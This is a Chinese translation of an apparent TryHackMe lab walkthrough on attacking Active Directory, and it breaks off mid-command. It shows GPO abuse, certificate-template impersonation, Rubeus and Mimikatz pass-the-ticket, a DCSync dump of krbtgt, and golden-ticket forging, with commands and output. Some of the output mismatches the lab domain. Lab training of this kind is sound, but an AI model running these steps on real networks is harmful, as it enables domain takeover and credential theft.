<p>为了修改GPO，我们需要以具有相关权限的AD用户访问组策略管理。 我们可以以用户身份通过 RDP 进入 THMSERVER1，但这可能会将用户踢出其活动会话，从而引起怀疑。 相反，我们将使用普通帐户或第 2 层管理员帐户通过 RDP 进入 THMWRK1，使用 runas 命令将 AD 用户的凭据注入内存，然后打开 MMC 来修改 GPO。 有关 runas 命令的回顾，请参阅 <a target="_blank" rel="noopener" href="http://tryhackme.com/room/adenumeration">Enumerate AD</a> room； 但是，此处还提供了应从管理命令提示符窗口执行的所需命令：</p>
<p>命令提示符</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt;runas /netonly /user:za.tryhackme.loc\&lt;AD Username&gt; cmd.exe</span><br></pre></td></tr></tbody></table></figure>

<p>出现提示后，提供与帐户关联的密码。 要验证您是否提供了正确的凭据，您可以运行“dir \za.tryhackme.loc\sysvol”。 在新生成的命令提示符窗口中，我们可以启动 Microsoft 管理控制台：</p>
<p> 命令提示符</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt;mmc</span><br></pre></td></tr></tbody></table></figure>

<p>MMC 截图。</p>
<p>我们现在要添加组策略管理管理单元：</p>
<ol>
<li>单击 <strong>文件</strong> -&gt; <strong>添加/删除管理单元</strong></li>
<li>选择 <strong>组策略管理</strong> 管理单元并单击 <strong>添加</strong></li>
<li>单击<strong>确定</strong></li>
</ol>
<p>您现在应该能够看到 za.tryhackme.com 域的 GPO：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/3d922a91f644df47518d483f4081250f.png" alt="GPO configuration"></p>
<p>现在，我们可以导航到用户有权修改的 GPO（服务器 &gt; 管理服务器 &gt; 管理服务器推送）。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/134d978444497bb2cd443f23f5140189.png" alt="GPO configuration"></p>
<p>我们可以右键单击 GPO 并选择“编辑”。 这将打开新的组策略管理编辑器窗口。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/2cc7d656ad4228036a52edca2f2bb531.png" alt="GPO configuration"></p>
<p>为了将我们的帐户添加到本地组，我们需要执行以下步骤：</p>
<ol>
<li>展开<strong>计算机配置</strong></li>
<li>展开<strong>政策</strong></li>
<li>展开 <strong>Windows 设置</strong></li>
<li>展开<strong>安全设置</strong></li>
<li>右键单击<strong>受限组</strong>并选择<strong>添加组</strong>（如果<strong>IT Support</strong>组已经存在，则意味着有人已经执行了该漏洞利用。您可以删除它并自行创建它 ，或者只是检查它以查看配置的内容。）</li>
<li>单击“<strong>浏览”，</strong>输入“<strong>IT 支持</strong>”，然后单击“<strong>检查名称</strong>”</li>
<li>单击“<strong>确定</strong>”两次</li>
</ol>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/f11e6ef429397c28b4748d1757f70b55.png" alt="GPO configuration"></p>
<p>不使用第一个过滤器。 对于第二个过滤器，我们要添加管理员组和远程桌面用户组。 最后，它应该看起来像这样：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/f6cb440043d8da6622a0d527c5bc3651.png" alt="GPO configuration"></p>
<p>配置完成后，我们可以单击<strong>应用</strong>和<strong>确定</strong>。 现在，我们需要做的就是等待最多 15 分钟，GPO 就会被应用。 此后，我们作为 <strong>IT 支持</strong>t 组成员的初始帐户现在将拥有 THMSERVER2 的管理和 RDP 权限！</p>
<h1 id="Exploiting-Certificates"><a href="#Exploiting-Certificates" class="headerlink" title="Exploiting Certificates"></a>Exploiting Certificates</h1><p>现在我们已经可以访问 THMSERVER2，我们通过利用所有第 1 层资产（服务器）进一步推进了利用 AD 的旅程。 然而，我们再次陷入困境，没有简单的方法可以进入下一层。 同样，我们需要寻找更多的创意途径。</p>
<p>SpecterOps 完成并作为<a target="_blank" rel="noopener" href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">白皮书</a> 发布的研究表明，可以利用错误配置的证书模板进行权限升级和横向移动。 如果您想更好地了解证书错误配置以及如何识别它们，请查看<a target="_blank" rel="noopener" href="http://tryhackme.com/jr/adcertificatetemplates">这个房间</a>。</p>
<p>AD证书服务</p>
<p>AD 证书服务 (CS) 是 Microsoft 的公钥基础设施 (PKI) 实现。 由于 AD 为组织提供了一定程度的信任，因此它可以用作 CA 来证明和委托信任。 AD CS 可用于多种用途，例如加密文件系统、创建和验证数字签名，甚至用户身份验证，这使其成为攻击者的一个有希望的途径。</p>
<p>由于 AD CS 是一项特权功能，因此它通常在选定的域控制器上运行。 这意味着普通用户无法真正直接与服务交互。 另一方面，组织往往太大，无法让管理员手动创建和分发每个证书。 这就是证书模板的用武之地。AD CS 管理员可以创建多个模板，允许任何具有相关权限的用户自行请求证书。 这些模板包含一些参数，说明哪个用户可以请求证书以及需要什么。 SpecterOps 发现这些参数的特定组合可能具有令人难以置信的毒性，并且会被滥用以进行权限升级和持久访问。</p>
<p>在我们深入探讨证书滥用之前，先介绍一些术语：</p>
<ul>
<li>PKI - 公钥基础设施是管理证书和公钥加密的系统</li>
<li>AD CS - Active Directory 证书服务是 Microsoft 的 PKI 实现，通常在域控制器上运行</li>
<li>CA - 证书颁发机构是颁发证书的 PKI</li>
<li>证书模板 - 定义 CA 颁发证书的方式和时间的设置和策略的集合</li>
<li>CSR - 证书签名请求是发送到 CA 以请求签名证书的消息</li>
<li>EKU - 扩展/增强密钥用法是定义如何使用生成的证书的对象标识符</li>
</ul>
<p>查找易受攻击的证书模板<br>为了找到存在漏洞的模板，我们将使用Windows的内置工具certutil。 使用 THMSERVER2 上的 RDP 访问，我们可以运行以下 Powershell 脚本来枚举证书：</p>
<p>电源外壳</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt;certutil -Template -v &gt; templates.txt</span><br></pre></td></tr></tbody></table></figure>

<p>这将提供所有配置模板的输出。 我们还可以使用证书审核工具，例如 Ghostpack 的 <a target="_blank" rel="noopener" href="https://github.com/GhostPack/PSPKIAudit">PSPKIAudit</a>。 然而，手动方法使我们能够确保找到所有可能的错误配置。 如果参数值组合变得有毒，则证书模板将被视为配置错误，从而允许请求者执行权限升级。 在我们的例子中，我们正在寻找具有以下有毒参数组合的模板：</p>
<ul>
<li><strong>客户端身份验证</strong> - 证书可用于客户端身份验证。</li>
<li><strong>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</strong> - 证书模板允许我们指定主题备用名称 (SAN)。</li>
<li><strong>CTPRIVATEKEY_FLAG_EXPORTABLE_KEY</strong> - 证书可使用私钥导出。</li>
<li><strong>证书权限</strong> - 我们拥有使用证书模板所需的权限。</li>
</ul>
<p>如果您有兴趣了解有关有毒参数组合的更多信息，请阅读 SpectreOps 的白皮书。 由于这个房间的目的是获得更广泛的 AD 利用攻击知识，因此我们将指出 Template[32] 是易受攻击的模板。 在此模板中，我们可以看到 THMSERVER2 的计算机帐户可以为模板发出 CSR，该 CSR 允许我们指定主题备用名称 (SAN) 并可用于客户端身份验证。</p>
<p>SpecterOps 提到了 AD CS 的八种常见安全错误配置，因此应该注意的是，仍然可以发现大量潜在的错误配置。</p>
<p>利用证书模板</p>
<p>使用 THMSERVER2 上的 RDP 访问，我们现在将请求我们的证书。 如果您使用 Remmina 并保存 RDP 连接的配置，请确保禁用 <strong>受限管理模式</strong>。 我们将使用 Microsoft 管理控制台 (MMC)：</p>
<p>1.点击<strong>开始</strong>-&gt;<strong>运行</strong><br>2. 输入 <strong>mmc</strong> 并按 Enter 键<br>3. 单击<strong>文件</strong>-&gt;<strong>添加/删除管理单元..</strong><br>4. 添加 <strong>证书</strong> 管理单元，并确保在提示中选择 <strong>计算机帐户</strong> 和 <strong>本地计算机</strong>。<br>5. 单击<strong>确定</strong></p>
<p>您现在应该看到证书管理单元：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/4304fb96c8fc796a4e26801843abcd6c.png" alt="MMC Certificates"></p>
<p>我们将要求个人证书：</p>
<ol>
<li>右键单击<strong>个人</strong>并选择<strong>所有任务</strong>-&gt;<strong>请求新证书…</strong></li>
<li>单击“下一步”两次，选择 AD 注册策略。</li>
<li>您将看到我们有一个可以请求的模板，但首先，我们需要提供其他信息。</li>
<li>单击“<strong>更多信息</strong>”警告。</li>
<li>将 <strong>主题名称类型</strong> 选项更改为 <strong>通用名称</strong> 并提供任意值（因为这并不重要），然后单击 <strong>添加</strong>。</li>
<li>将 <strong>替代名称类型</strong> 选项更改为 <strong>用户主体名称</strong>。</li>
<li>提供您要模拟的用户的 UPN。 最好是 DA 帐户，例如 <a href="mailto:Administrator@za.tryhackme.loc">Administrator@za.tryhackme.loc</a>，然后单击 <strong>添加。</strong></li>
</ol>
<p>您的附加信息应如下所示：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/20cd4305f7a15c9ceb3ddd8c96088b09.png" alt="MMC Certificates"></p>
<p>一旦您对此感到满意，请单击“<strong>应用</strong>”和“<strong>确定</strong>”。 然后，选择证书并单击“<strong>注册</strong>”。 您应该能够看到您的证书：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6bed1474264e87f3be91e028a06b317b.png" alt="MMC Certificates"></p>
<p>最后一步是使用私钥导出我们的证书：</p>
<ol>
<li>右键单击证书并选择<strong>所有任务</strong>-&gt;<strong>导出…</strong></li>
<li>单击“<strong>下一步</strong>”，选择“<strong>是，导出私钥</strong>”，然后单击“<strong>下一步</strong>”。</li>
<li>单击<strong>下一步</strong>，然后为证书设置密码，因为没有密码无法导出私钥。</li>
<li>单击<strong>下一步</strong>并选择存储证书的位置。</li>
<li>单击“<strong>下一步</strong>”，最后单击“<strong>完成”。</strong></li>
</ol>
<p>通过证书模拟用户</p>
<p>现在我们终于可以模拟用户了。 要执行此操作，需要执行两个步骤：</p>
<ul>
<li>使用证书请求 Kerberos 票证授予票证 (TGT)</li>
<li>将 Kerberos TGT 加载到您选择的黑客平台中</li>
</ul>
<p>第一步，我们将使用 <a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">Rubeus</a>。 已编译的版本可在“C:\Tools\”目录中找到。 打开命令提示符窗口并导航到该目录。 我们将使用以下命令来请求 TGT：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:&lt;path to  certificate&gt; /password:&lt;certificate file password&gt;  /outfile:&lt;name of file to write TGT to&gt; /domain:za.tryhackme.loc /dc:&lt;IP of domain controller&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>我们来分解一下参数：</p>
<ul>
<li><strong>/user</strong> - 这指定我们将模拟的用户，并且必须与我们生成的证书的 UPN 相匹配</li>
<li><strong>/enctype</strong> - 这指定票证的加密类型。 设置此项对于规避很重要，因为默认加密算法很弱，这会导致溢出警报</li>
<li><strong>/certificate</strong> - 我们生成的证书的路径</li>
<li><strong>/password</strong> - 我们的证书文件的密码</li>
<li><strong>/outfile</strong> - TGT 将输出到的文件</li>
<li><strong>/domain</strong> - 我们当前攻击的域的 FQDN</li>
<li><strong>/dc</strong> - 我们请求 TGT 的域控制器的 IP。 通常最好选择运行CA服务的DC</li>
</ul>
<p>执行命令后，我们应该会收到 TGT：</p>
<p> TGT 请求</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">  C:\THMTools&gt; .\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:12.31.1.101</span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.0.0</span><br><span class="line"></span><br><span class="line">[*] Action: Ask TGT</span><br><span class="line"></span><br><span class="line">[*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert</span><br><span class="line">[*] Building AS-REQ (w/ PKINIT preauth) for: 'lunar.eruca.com\svc.gitlab'</span><br><span class="line">[+] TGT request successful!</span><br><span class="line">[*] base64(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIGADCCBfygAwIBBaEDAgEWooIE+jCCBPZhggTyMIIE7qADAgEFoREbD0xVTkFSLkVSVUNBLkNPTaIk</span><br><span class="line">      MCKgAwIBAqEbMBkbBmtyYnRndBsPbHVuYXIuZXJ1Y2EuY29to4IErDCCBKigAwIBEqEDAgECooIEmgSC</span><br><span class="line">      BJaqEcIY2IcGQKFNgPbDVY0ZXsEdeJAmAL2ARoESt1XvdKC5Y94GECr+FoxztaW2DVmTpou8g116F6mZ</span><br><span class="line">      nSHYrZXEJc5Z84qMGEzEpa38zLGEdSyqIFL9/avtTHqBeqpR4kzY2B/ekqhkUvdb5jqapIK4MkKMd4D/</span><br><span class="line">      MHLr5jqTv6Ze2nwTMAcImRpxE5HSxFKO7efZcz2glEk2mQptLtUq+kdFEhDozHMAuF/wAvCXiQEO8NkD</span><br><span class="line">      zeyabnPAtE3Vca6vfmzVTJnLUKMIuYOi+7DgDHgBVbuXqorphZNl4L6o5NmviXNMYazDybaxKRvzwrSr</span><br><span class="line">      2Ud1MYmJcIsL3DMBa4bxR57Eb5FhOVD29xM+X+lswtWhUO9mUrVyEuHtfV7DUxA94OvX1QmCcas4LXQW</span><br><span class="line">      ggOit/DCJdeyE8JjikZcR1yL4u7g+vwD+SLkusCZE08XDj6lopupt2Hl8j2QLR2ImOJjq54scOllW4lM</span><br><span class="line">      Qek4yqKwP6p0oo4ICxusM8cPwPUxVcYdTCh+BczRTbpoKiFnI+0qOZDtgaJZ/neRdRktYhTsGL39VHB5</span><br><span class="line">      i+kOk3CkcstLfdAP1ck4O+NywDMUK+PhGJM/7ykFe2zICIMaGYGnUDRrad3z8dpQWGPyTBgTvemwS3wW</span><br><span class="line">      NuPbQFFaoyiDiJyXPh+VqivhTUX9st80ZJZWzpE7P1pTNPGq38/6NyLjiE9srbOt6hCLzUaOSMGH1Enf</span><br><span class="line">      SYmNljeW2R0gsFWBaFt16AHfT9G9Et2nOCJn/D/OFePFyR4uJF44p82CmVlBhzOxnCaGtQM2v9lwBqQF</span><br><span class="line">      CcVLjxGXqKrPUr1RUGthP861jhMoXD4jBJ/Q32CkgVdlJRMweqcIfNqP/4mEjbUN5qjNqejYdUb/b5xw</span><br><span class="line">      S794AkaKHcLFvukd41VTm87VvDOp6mM5lID/PLtTCPUZ0zrEb01SNiCdB5IAfnV23vmqsOocis4uZklG</span><br><span class="line">      CNdI1/lsICpS/jaK6NM/0oKehMg+h4VAFLx4HnTSY4ugbrkdxU948qxPEfok/P6umEuny7yTDQFoCUKk</span><br><span class="line">      RuLXbtwwplYTGBDLfzwhcNX8kc/GGLbH9+B8zRXxhd3TGQ7ZT03r798AjobKx024ozt6g4gjS5k/yIT+</span><br><span class="line">      f29XrPzc+UODunO2Qv8JM5NAE3L6ryHp/DdgTaXGBRccgQBeQERNz6wxkdVK6SB7juOjU5JoZ5ZfmTuO</span><br><span class="line">      hQ5hnboH1GvMy4+zeU2P7foWEJE76i9uZMbjUilbWRERYUL/ZjjXQBVWBaxoAdFIoawAzSXUZniNavnS</span><br><span class="line">      n22qqgbd79Zj+lRavAb7Wlk5Gul4G6LMkh2MIJ4JOnrV0JV1yOhoqZ5V6KX/2r7ecyrVZIf2Qf0+ci9G</span><br><span class="line">      vboJiLvWKgXkx7VaKbcLhO743BNYyq57nPNvWhVt3jbFmEq4nTdNou6hQHG4O5hVMhBKGgTwYz3yFPOP</span><br><span class="line">      iuxroniQawSUJbmwObxVeoculPhxEJ69MSgKROTXrKrQAJ84D5QJHQYZus6w+LtodZn1//ZLhgILeFsY</span><br><span class="line">      5K6d4ot2eqEr/A4Vu+wFjGjw87FTvHVcf8HdtGhqkawtPOrzo4HxMIHuoAMCAQCigeYEgeN9geAwgd2g</span><br><span class="line">      gdowgdcwgdSgKzApoAMCARKhIgQgQr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVWhERsPTFVO</span><br><span class="line">      QVIuRVJVQ0EuQ09NohcwFaADAgEBoQ4wDBsKc3ZjLmdpdGxhYqMHAwUAQOEAAKURGA8yMDIyMDIwNjE3</span><br><span class="line">      NTQ0NlqmERgPMjAyMjAyMDcwMzU0NDZapxEYDzIwMjIwMjEzMTc1NDQ2WqgRGw9MVU5BUi5FUlVDQS5D</span><br><span class="line">      T02pJDAioAMCAQKhGzAZGwZrcmJ0Z3QbD2x1bmFyLmVydWNhLmNvbQ=</span><br><span class="line"></span><br><span class="line">  ServiceName              :  krbtgt/za.tryhackme.loc</span><br><span class="line">  ServiceRealm             : ZA.TRYHACKME.LOC</span><br><span class="line">  UserName                 : Adminsitrator</span><br><span class="line">  UserRealm                : ZA.TRYHACKME.LOC</span><br><span class="line">  StartTime                :  2/6/2022 5:54:46 PM</span><br><span class="line">  EndTime                  :  2/7/2022 3:54:46 AM</span><br><span class="line">  RenewTill                :  2/13/2022 5:54:46 PM</span><br><span class="line">  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable</span><br><span class="line">  KeyType                  :  aes256_cts_hmac_sha1</span><br><span class="line">  Base64(key)              :  Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU=</span><br><span class="line">  ASREP (key)              :  BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED</span><br><span class="line">      </span><br></pre></td></tr></tbody></table></figure>

<p>现在我们可以使用 Mimikatz 加载 TGT 并向 THMDC 进行身份验证：</p>
<p>电源外壳</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         C:\Tools&gt;mimikatz_trunk\x64\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span><br><span class="line"> .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege '20' OK</span><br><span class="line"></span><br><span class="line">mimikatz # kerberos::ptt administrator.kirbi</span><br><span class="line"></span><br><span class="line">* File: 'administrator.kirbi': OK</span><br><span class="line"></span><br><span class="line">mimikatz # exit</span><br><span class="line">Bye!</span><br><span class="line"></span><br><span class="line">C:\Tools&gt;dir \\THMDC.za.tryhackme.loc\c$\</span><br><span class="line"> Volume in drive \\THMDC.za.tryhackme.loc\c$ is Windows</span><br><span class="line"> Volume Serial Number is 1634-22A9</span><br><span class="line"></span><br><span class="line"> Directory of \\THMDC.za.tryhackme.loc\c$</span><br><span class="line"></span><br><span class="line">01/04/2022  08:47 AM               103 delete-vagrant-user.ps1</span><br><span class="line">04/30/2022  10:24 AM               154 dns_entries.csv</span><br><span class="line">04/27/2022  10:53 PM           885,468 MzIzMzViM2ItMmQ2Zi00YWQ3LWEwNjEtYjg2MmFjNzViY2Ix.bin</span><br><span class="line">09/15/2018  08:19 AM    &lt;DIR&gt;          PerfLogs</span><br><span class="line">03/21/2020  09:31 PM    &lt;DIR&gt;          Program Files</span><br><span class="line">03/21/2020  09:28 PM    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">04/27/2022  08:27 AM             1,423 thm-network-setup-dc.ps1</span><br><span class="line">04/25/2022  07:13 PM    &lt;DIR&gt;          tmp</span><br><span class="line">04/27/2022  08:22 AM    &lt;DIR&gt;          Users</span><br><span class="line">04/25/2022  07:11 PM    &lt;SYMLINKD&gt;     vagrant [\\vboxsvr\vagrant]</span><br><span class="line">04/27/2022  08:12 PM    &lt;DIR&gt;          Windows</span><br><span class="line">               7 File(s)      2,356,811 bytes</span><br><span class="line">               7 Dir(s)  50,914,541,568 bytes free</span><br></pre></td></tr></tbody></table></figure>

<p>最后，我们可以访问第 0 层基础设施，并破坏了整个子域！</p>
<h1 id="Exploiting-Domain-Trusts"><a href="#Exploiting-Domain-Trusts" class="headerlink" title="Exploiting Domain Trusts"></a>Exploiting Domain Trusts</h1><p>尽管我们可以访问第 0 层基础设施，但这仍然不够。 我们仅利用了 ZA.TRYHACKME.LOC 域。 TRYHACKME 肯定也必须有其他地区的域名吗？ 好吧，如果我们控制了根域 TRYHACKME.LOC，我们将能够危害所有这些区域域。 在此任务中，我们将了解如何利用域信任来控制整个森林。</p>
<p>域名信托</p>
<p>正如 <a target="_blank" rel="noopener" href="https://tryhackme.com/jr/activedirectorybasics">AD 基础知识室</a> 中所讨论的，森林是 AD 网络内一棵或多棵域树的集合。 域信任是网络中的用户访问域中其他资源的一种机制。 在大多数情况下，信任概述了林内的域如何相互通信。 在某些环境中，信任可以扩展到外部域，在某些情况下甚至可以扩展到林。</p>
<p>域之间可以配置的信任主要有两种类型：</p>
<ul>
<li>方向性 - 信任从信任域流向受信任域的方向</li>
<li>可传递的 - 信任关系不仅仅限于两个域，还包括其他受信任的域</li>
</ul>
<p>林中通常有根域或父域。 在我们的例子中，这是 TRYHACKME.LOC。 对于每个区域办事处，都会创建子域，例如 ZA.TRYHACKME.LOC 或 UK.TRYHACKME.LOC。 此林配置将允许 ZA 和英国办事处之间共享资源。 例如，如果英国办公室的某个用户需要访问 THMSERVER1，我们可以为 ZA 域中的用户授予访问权限。 此权限委派之所以有效，是因为 ZA 和根域以及 UK 和根域之间存在双向信任，本质上是在 ZA 和 UK 之间创建传递信任。</p>
<p>如上所述，父域和子域之间的信任是双向的。 这是预期的行为，用于通过更大的可传递信任关系来共享资源。 然而，作为攻击者，如果我们已经破坏了子域，我们也可以利用这种信任来破坏父域。</p>
<p>KRBTGT 和黄金门票</p>
<p>KRBTGT 是用于 Microsoft 实施 Kerberos 的帐户。 该名称源自 Kerberos (KRB) 和票证授予票证 (TGT)。 本质上，此帐户充当 Kerberos 分发中心 (KDC) 服务的服务帐户，该服务处理所有 Kerberos 票证请求。 此帐户用于加密和签署域的所有 Kerberos 票证。 由于密码哈希由所有域控制器共享，因此当用户请求访问资源时，它们可以验证收到的 TGT 的真实性。</p>
<p>但是，如果我们想生成自己的 TGT 来授予我们访问所有内容的权限，该怎么办？ 这称为金票攻击。 在金票攻击中，我们完全绕过 KDC 并创建我们自己的 TGT，本质上成为票证授予服务器 (TGS)。 为了伪造 TGT，我们需要以下信息：</p>
<ul>
<li>域的 FQDN</li>
<li>域的安全标识符 (SID)</li>
<li>我们要模拟的帐户的用户名</li>
<li>KRBTGT 密码哈希</li>
</ul>
<p>前三个通常很容易恢复。 最后一个需要域妥协，因为 KRBTGT 密码哈希仅存储在域控制器上。 幸运的是，我们刚刚使用伪造的证书破坏了第 0 层管理员组，因此我们能够恢复 KRBTGT 密码哈希。</p>
<p>我们将再次使用带有 DC Sync 的 Mimikatz 来恢复 THMSERVER2 上的 KRBTGT 密码哈希：</p>
<p> 命令提示符</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         C:\Tools&gt;mimikatz_trunk\x64\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span><br><span class="line"> .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege '20' OK</span><br><span class="line"></span><br><span class="line">mimikatz # lsadump::dcsync /user:za\krbtgt</span><br><span class="line">[DC] 'za.tryhackme.loc' will be the domain</span><br><span class="line">[DC] 'THMDC.za.tryhackme.loc' will be the DC server</span><br><span class="line">[DC] 'za\krbtgt' will be the user account</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line"></span><br><span class="line">Object RDN           : krbtgt</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : krbtgt</span><br><span class="line">Account Type         : 30000000 ( USER_OBJECT )</span><br><span class="line">User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : 4/25/2022 7:18:22 PM</span><br><span class="line">Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-502</span><br><span class="line">Object Relative ID   : 502</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: removed</span><br><span class="line">    ntlm- 0: removed</span><br><span class="line">    lm  - 0: removed</span><br><span class="line">[....]</span><br></pre></td></tr></tbody></table></figure>

<p>领域间 TGT</p>
<p>使用 KRBTGT 密码哈希，我们现在可以伪造黄金票证来访问子域中的任何资源。 这也将在持久 AD 室中进行更详细的讨论。 然而，我们可以通过打造跨领域 TGT 来更进一步。 领域间 TGT 用于提供对其他域中资源的访问。 在我们的例子中，我们希望利用子域和父域之间的双向信任关系来获得对父域的完全访问权限。</p>
<p>当我们构建金票来执行此漏洞时，我们将包含来自其他域的额外帐户 SID。 Mimikatz 可以对此提供帮助，允许我们设置 Kerberos TGT 的 KERB_VALIDATION_INFO 结构的 ExtraSids 部分。 ExtraSids 部分被描述为“指向 KERB_SID_AND_ATTRIBUTES 结构列表的指针，该结构包含与主体所属帐户域以外的域中的组相对应的 SID 列表”。</p>
<p>这里的关键是，我们将通过将企业管理员 (EA) 组的 SID 作为额外的 SID 添加到我们为子域的域控制器伪造的票证中，来利用父域对子域的信任。 EA 组属于父域，并且该组的成员身份实质上授予对整个林的管理权限！ 该组的默认 SID 是 S-1-5-21-<rootdomain>-519。</rootdomain></p>
<p>在我们开始利用之前，我们首先需要恢复两个 SID：</p>
<ul>
<li>子域控制器 (THMDC) 的 SID，我们将在伪造的 TGT 中模拟它</li>
<li>父域中企业管理员的 SID，我们将其作为额外的 SID 添加到伪造的 TGT 中</li>
</ul>
<p>要恢复这些 SID，我们可以使用 AD-RSAT Powershell cmdlet。 我们可以使用以下命令恢复子域控制器的SID：</p>
<p> 命令提示符</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         PS C:\&gt; Get-ADComputer -Identity "THMDC"</span><br><span class="line"></span><br><span class="line">DistinguishedName : CN=THMDC,OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc</span><br><span class="line">DNSHostName       : THMDC.za.tryhackme.loc</span><br><span class="line">Enabled           : True</span><br><span class="line">Name              : THMDC</span><br><span class="line">ObjectClass       : computer</span><br><span class="line">ObjectGUID        : bd651750-782b-4b09-93b4-b5987ec7311b</span><br><span class="line">SamAccountName    : THMDC$</span><br><span class="line">SID               : S-1-5-21-3885271727-2693558621-2658995185-1001</span><br><span class="line">UserPrincipalName :</span><br></pre></td></tr></tbody></table></figure>

<p>我们可以使用以下命令查询父域控制器来恢复 Enterprise Admins 组的 SID：</p>
<p> 命令提示符</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         PS C:\&gt; Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc</span><br><span class="line"></span><br><span class="line">DistinguishedName : CN=Enterprise Admins,CN=Users,DC=tryhackme,DC=loc</span><br><span class="line">GroupCategory     : Security</span><br><span class="line">GroupScope        : Universal</span><br><span class="line">Name              : Enterprise Admins</span><br><span class="line">ObjectClass       : group</span><br><span class="line">ObjectGUID        : a23ae384-16e8-44d5-9b36-8173c4e0e5de</span><br><span class="line">SamAccountName    : Enterprise Admins</span><br><span class="line">SID               : S-1-5-21-3330634377-removed-519</span><br></pre></td></tr></tbody></table></figure>

<p>利用域信任</p>
<p>我们终于拥有了创建伪造 TGT 所需的所有信息。 我们将使用 Mimikatz 生成这张金票。 该命令将如下所示：</p>
<p> 命令提示符</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         C:\Tools&gt;mimikatz_trunk\x64\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span><br><span class="line"> .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege '20' OK</span><br><span class="line"></span><br><span class="line">mimikatz # kerberos::golden 